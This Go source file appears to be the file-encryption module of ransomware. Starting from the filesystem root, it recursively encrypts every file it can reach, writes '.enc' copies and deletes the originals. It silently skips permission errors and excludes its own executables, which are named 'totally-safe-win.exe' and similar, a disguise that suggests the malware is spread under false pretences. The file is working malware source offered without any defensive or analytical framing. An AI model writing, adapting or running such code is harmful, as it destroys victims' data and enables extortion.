package Crypto

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
)

func GetAndEncryptFiles(key string) (bool, error) {
	startDir := "/"
	err := processDirectory(key, startDir)
	if err != nil {
		return false, err
	}
	return true, nil
}

func EncryptFile(key string, filePath string) error {
	// Read the file contents and start encryption
	fileData, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}
	encrypted, err := EncryptData(key, fileData)
	if err != nil {
		return err
	}
	newFilePath := fmt.Sprintf("%s.enc", filePath)

	err = os.WriteFile(newFilePath, encrypted, 0777)
	if err != nil {
		log.Fatalf("write file err: %v", err.Error())
	}
	//delete original file path
	err = os.Remove(filePath)
	if err != nil {
		log.Fatalf("remove file err: %v", err.Error())
	}

	return nil
}

func processDirectory(key string, dirPath string) error {
	getFiles, err := os.ReadDir(dirPath)
	if err != nil {
		if os.IsPermission(err) {
			// log.Printf("skipping directory %s due to permission denied error: %v", dirPath, err)
			return nil
		}
		if os.IsNotExist(err) {
			// log.Printf("directory %s does not exist, skipping: %v", dirPath, err)
			return nil
		}
		if err.Error() == "bad file descriptor" {
			// log.Printf("skipping directory %s due to bad file descriptor error: %v", dirPath, err)
		} else {
			// log.Printf("error reading directory %s: %v", dirPath, err)
			return nil
		}
	}
	for _, file := range getFiles {
		filePath := filepath.Join(dirPath, file.Name())
		if file.IsDir() {
			err := processDirectory(key, filePath)
			if err != nil {
				if os.IsPermission(err) {
					// log.Printf("skipping directory %s due to permission denied error: %v", filePath, err)
					continue
				}
				if os.IsNotExist(err) {
					// log.Printf("directory %s does not exist, skipping: %v", filePath, err)
					continue
				}
				if err.Error() == "bad file descriptor" {
					// log.Printf("skipping directory %s due to bad file descriptor error: %v", filePath, err)
					continue
				}
				return err
			}
		} else {
			if file.Name() == "totally-safe-win.exe" ||
				file.Name() == "totally-safe-lnx.exe" ||
				file.Name() == "totally-safe-mc.exe" {
				continue
			}
			// fmt.Println(filePath)
			err := EncryptFile(key, filePath)
			if err != nil {
				if os.IsPermission(err) {
					// log.Printf("skipping file %s due to permission denied error: %v", filePath, err)
					continue
				}
				if os.IsNotExist(err) {
					// log.Printf("file %s does not exist, skipping: %v", filePath, err)
					continue
				}
				if err.Error() == "bad file descriptor" {
					// log.Printf("skipping file %s due to bad file descriptor error: %v", filePath, err)
					continue
				}
				return err
			}
		}

	}
	return nil
}
